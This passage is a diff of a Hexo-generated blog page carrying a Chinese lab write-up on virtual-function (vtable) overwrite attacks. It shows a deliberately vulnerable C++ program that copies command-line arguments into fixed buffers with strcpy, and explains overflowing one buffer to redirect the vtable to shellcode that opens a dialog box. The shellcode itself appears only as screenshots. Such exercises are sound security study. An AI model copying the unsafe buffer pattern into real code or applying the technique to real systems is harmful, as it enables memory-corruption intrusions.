class="built_in">test</span>();</span><br><span class="line">	} <span class="keyword">else</span> {</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"vf argv1 argv2\n"</span>);</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;iostream.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">vf</span> {</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">void</span>)</span> </span>{</span><br><span class="line">		cout&lt;&lt;<span class="string">"Class Vtable::test()"</span>&lt;&lt;endl;</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line">;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">vf1</span> {</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">void</span>)</span> </span>{</span><br><span class="line">		cout&lt;&lt;<span class="string">"Class Vtable1::test()"</span>&lt;&lt;endl;</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line">;</span><br><span class="line">vf overflow, *p;</span><br><span class="line">vf1 overflow1, *p1;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>{</span><br><span class="line">	<span class="built_in">LoadLibrary</span>(<span class="string">"user32.dll"</span>);</span><br><span class="line">	<span class="comment">//char * p_vtable;</span></span><br><span class="line">	<span class="comment">//p_vtable=overflow.buf-4;</span></span><br><span class="line">	<span class="comment">//point to virtual table</span></span><br><span class="line">	<span class="comment">//__asm int 3 </span></span><br><span class="line">	<span class="comment">//reset fake virtual table to 0x004088cc </span></span><br><span class="line">	<span class="comment">//the address may need to adjusted via runtime debug</span></span><br><span class="line">	<span class="comment">//p_vtable[0]=0x30; </span></span><br><span class="line">	<span class="comment">//p_vtable[1]=0xE4; </span></span><br><span class="line">	<span class="comment">//p_vtable[2]=0x42; </span></span><br><span class="line">	<span class="comment">//p_vtable[3]=0x00;</span></span><br><span class="line">	<span class="keyword">if</span> (argc == <span class="number">3</span>) {</span><br><span class="line">		<span class="built_in">strcpy</span>(overflow.buf,argv[<span class="number">1</span>]);</span><br><span class="line">		<span class="built_in">strcpy</span>(overflow<span class="number">1.</span>buf,argv[<span class="number">2</span>]);</span><br><span class="line">		<span class="comment">//set fake virtual function pointer</span></span><br><span class="line">		p=&amp;overflow;</span><br><span class="line">		p-&gt;<span class="built_in">test</span>();</span><br><span class="line">	} <span class="keyword">else</span> {</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"vf argv1 argv2\n"</span>);</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
 <ol>
 <li>
 <p>这应该是利用虚函数攻击的一个例子。其中定义了两个类：<code>vf</code>和 v<code>f1</code>，<code>vf</code>具有 200 字节的<code>buf</code>大小，而<code>vf1</code>具有 64 字节的<code>buf</code>大小。我们需要提供两个参数，一个复制到<code>vf</code>的<code>buf</code>区，另一个复制到<code>vf1</code><br>
-的<code>buf</code>区中，要通过<code>vf</code>类的<code>test</code>方法调用 shellcode。 <img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/%E6%80%9D%E8%80%831.png" class=""></p>
+的<code>buf</code>区中，要通过<code>vf</code>类的<code>test</code>方法调用 shellcode。 <img src="/2019/12/12/experiments/security/software/virtual_func_and_seh/%E6%80%9D%E8%80%831.png" class=""></p>
 </li>
 <li>
 <p><code>argv[1]</code>被复制到<code>overflow.buf</code>中，起始地址为<code>0x42eb5c</code>。算出其终止地址应为<code>0x42ec20</code>。</p>
-<img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/%E6%80%9D%E8%80%832.png" class=""> 
-<img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/%E6%80%9D%E8%80%833.png" class="" title="前面四个字节0x0042801c应该是vtable的地址，一会我们要覆盖掉它">
+<img src="/2019/12/12/experiments/security/software/virtual_func_and_seh/%E6%80%9D%E8%80%832.png" class=""> 
+<img src="/2019/12/12/experiments/security/software/virtual_func_and_seh/%E6%80%9D%E8%80%833.png" class="" title="前面四个字节0x0042801c应该是vtable的地址，一会我们要覆盖掉它">
 </li>
 <li>
 <p>第二个<code>strcpy</code>时，将第二个参数拷贝到<code>overflow1.buf</code>中，其首地址为<code>0x42eb14</code>，在<code>overflow</code>上方，我们想到应该可以利用这个关系，溢出这个 64 字节的<code>buf</code>，覆盖掉<code>vtable</code>，让其调用 shellcode</p>
-<img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/%E6%80%9D%E8%80%834.png" class=""> <img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/%E6%80%9D%E8%80%835.png" class="">
+<img src="/2019/12/12/experiments/security/software/virtual_func_and_seh/%E6%80%9D%E8%80%834.png" class=""> <img src="/2019/12/12/experiments/security/software/virtual_func_and_seh/%E6%80%9D%E8%80%835.png" class="">
 </li>
 <li>
 <p>构造 shellcode 如下，其中插入<code>vf</code>中的 shellcode1 写入弹框代码，插入<code>vf1</code>中的 shellcode2 向下覆盖掉<code>vf1</code>的<code>vtable</code><br>
 ，变为 shellcode1 的尾地址，而令 shellcode1 中最后四字节为 shellcode 第一个指令的地址（即<code>overflow.buf</code>的起始位置）。在这个构造下，可以成功执行 shellcode，以弹出对话框。</p>
-<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/argv%5B1%5D.png" class="" title="argv[1]"></div><div class="group-picture-column"><img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/argv%5B2%5D.png" class="" title="argv[2]"></div></div></div>
-<img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/%E6%80%9D%E8%80%838.png" class="">
+<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img src="/2019/12/12/experiments/security/software/virtual_func_and_seh/argv%5B1%5D.png" class="" title="argv[1]"></div><div class="group-picture-column"><img src="/2019/12/12/experiments/security/software/virtual_func_and_seh/argv%5B2%5D.png" class="" title="argv[2]"></div></div></div>
+<img src="/2019/12/12/experiments/security/software/virtual_func_and_seh/%E6%80%9D%E8%80%838.png" class="">
 </li>
 <li>
-<p>利用成功截图。 <img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/%E6%80%9D%E8%80%839.png" class=""></p>
+<p>利用成功截图。 <img src="/2019/12/12/experiments/security/software/virtual_func_and_seh/%E6%80%9D%E8%80%839.png" class=""></p>
 </li>
 </ol>
 
@@ -523,7 +616,7 @@
       <a href="https://blog.jason0743.space/2019/12/12/experiments/security/software/virtual_func_and_seh/" title="虚函数攻击与 SEH">https://blog.jason0743.space/2019/12/12/experiments/security/software/virtual_func_and_seh/</a>
   </li>
   <li class="post-copyright-license">
-      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener external nofollow noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请注明出处！
   </li>
 </ul>
 </div>
@@ -675,7 +768,7 @@
       </span>
     </span>
 </div>
-  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a> &amp; <a href="https://theme-next.js.org/muse/" rel="noopener external nofollow noreferrer" target="_blank">NexT.Muse</a> 强力驱动
+  <div class="powered-by">由 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> &amp; <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span> 强力驱动
   </div>
 
     </div>
@@ -691,7 +784,7 @@
   <div class="reading-progress-bar"></div>
   <a role="button" class="book-mark-link book-mark-link-fixed"></a>
 
-  <a href="https://github.com/jasonren0403" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener external nofollow noreferrer" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL2phc29ucmVuMDQwMw==" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
 
 <noscript>
   <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
